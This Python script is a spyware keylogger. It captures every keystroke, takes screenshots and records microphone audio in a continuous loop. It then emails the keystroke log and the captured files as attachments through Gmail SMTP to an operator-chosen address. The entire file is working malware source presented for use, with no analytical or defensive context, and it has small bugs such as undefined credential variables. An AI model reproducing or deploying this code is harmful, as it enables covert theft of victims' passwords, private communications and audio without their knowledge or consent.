# for captuing screenshot
import pyscreenshot
# for capturing key strokes
import pynput.keyboard
# for threading
import threading
# for recording and saving audio
import sounddevice as sd
from scipy.io.wavfile import write
# for sending mail with attachment
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


class keylogger:

    def __init__(self,id1,id2,pswd):

        self.log = ""

    def screenshot(self):
        image = pyscreenshot.grab()
        image.save("screenshot.jpg")
        self.mail("screenshot.jpg")

    def audio(self):
        fs = 44100  # Sample rate
        seconds = 10

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished
        write('output.wav', fs, myrecording)  # Save as WAV file
        self.mail("output.wav")
        self.screenshot()
        timer = threading.Timer(0,self.audio)
        timer.start()

    def mail(self,file):

        message = MIMEMultipart()

        message["From"] = id1
        message["To"] = id2

        attachment = open(file,'rb')
        body = self.log

        message.attach(MIMEText(body,"plain"))

        obj = MIMEBase('application','octet-stream')

        obj.set_payload((attachment).read())
        encoders.encode_base64(obj)
        obj.add_header("Content-Disposition","attachment; filename= " + file)

        message.attach(obj)

        my_message = message.as_string()

        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(id1,pswd)
        server.sendmail(id1,id2,my_message)
        self.log = ""
        server.quit()

    def add_to_log(self,k):
        self.log = self.log + k

    def process_key_press(self,key):
        try:
            k = str(key.char)
        except AttributeError:
            if key == key.space:
                k = " "
            else:
                k = " " + (str(key)) + " "
        self.add_to_log(k)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboard_listener:
            self.audio()
            keyboard_listener.join()

obj = keylogger(id1,id2,pswd)
obj.start()
